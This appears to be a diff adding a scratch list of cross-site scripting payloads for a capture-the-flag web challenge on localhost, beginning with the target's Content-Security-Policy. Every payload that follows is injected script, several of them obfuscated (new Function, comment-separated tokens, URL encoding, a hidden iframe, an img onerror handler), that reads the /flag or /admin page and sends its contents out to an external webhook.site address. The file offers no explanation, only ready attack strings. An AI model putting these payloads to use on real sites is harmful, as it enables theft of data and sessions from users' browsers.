@@ -1,0 +1,18 @@
+base-uri 'none'; 
+default-src 'none'; 
+form-action 'none';
+frame-ancestors 'none'; 
+script-src 'unsafe-inline';
+
+<iframe sandbox="allow-scripts allow-same-origin"><script>fetch("http://localhost:8989/flag")["then"](response=>response["text"]())["then"](text=>{window["location"]["href"]="https://webhook.site/c88b52ab-e506-4b76-8f85-1dc2aee81c98/?d="+text["substring"](1,10);});</script></iframe>
+
+http://localhost:8989/xss?xss=<script>fetch("/admin")["then"](response=>response["text"]())["then"](text=>{window["location"]["href"]="https://webhook.site/c88b52ab-e506-4b76-8f85-1dc2aee81c98/?d="+text["substring"](1,10);});</script>////
+http://localhost:8989/xss?xss=<script>fetch('/flag').then(response=>response.text()).then(flag =>{location.href="https://webhook.site/c88b52ab-e506-4b76-8f85-1dc2aee81c98/?d="+flag;});</script>
+http://localhost:8989/xss?xss=<script>await fetch("/flag").then(res=>res.text()).then(text=>{location.href="https://webhook.site/c88b52ab-e506-4b76-8f85-1dc2aee81c98/?d="+text;});</script>
+<script>location.href="https://webhook.site/c88b52ab-e506-4b76-8f85-1dc2aee81c98"</script>
+
+http://localhost:8989/xss?xss=<script>var/**/exploit=new/**/Function("fetch('http://localhost:8989/flag').then(r=>r.text()).then(flag=>location.href='https://webhook.site/c88b52ab-e506-4b76-8f85-1dc2aee81c98/?d='+encodeURIComponent(flag))");exploit();</script>
+http://localhost:8989/xss?xss=%3Cscript%3Evar%2F%2A%2A%2Fexploit%3Dnew%2F%2A%2A%2FFunction%28%22fetch%28%27http%3A%2F%2Flocalhost%3A8989%2Fflag%27%29.then%28r%3D%3Er.text%28%29%29.then%28flag%3D%3Elocation.href%3D%27https%3A%2F%2Fwebhook.site%2Fc88b52ab-e506-4b76-8f85-1dc2aee81c98%2F%3Fd%3D%27%2BencodeURIComponent%28flag%29%29%22%29%3Bexploit%28%29%3B%3C%2Fscript%3E
+http://localhost:8989/xss?xss=<script>var/**/iframe=document.createElement('iframe');iframe.style.display='none';iframe.src='/flag';document.body.appendChild(iframe);iframe.onload=function(){try{var/**/flag=iframe.contentWindow.document.body.innerText;location.href='https://webhook.site/c88b52ab-e506-4b76-8f85-1dc2aee81c98/?flag='+encodeURIComponent(flag);}catch(e){console.log('Error:',e);}};</script>
+
+http://localhost:8989/xss?xss=<img src="#" onerror=`javascript:location.href='https://webhook.site/c88b52ab-e506-4b76-8f85-1dc2aee81c98'`/>
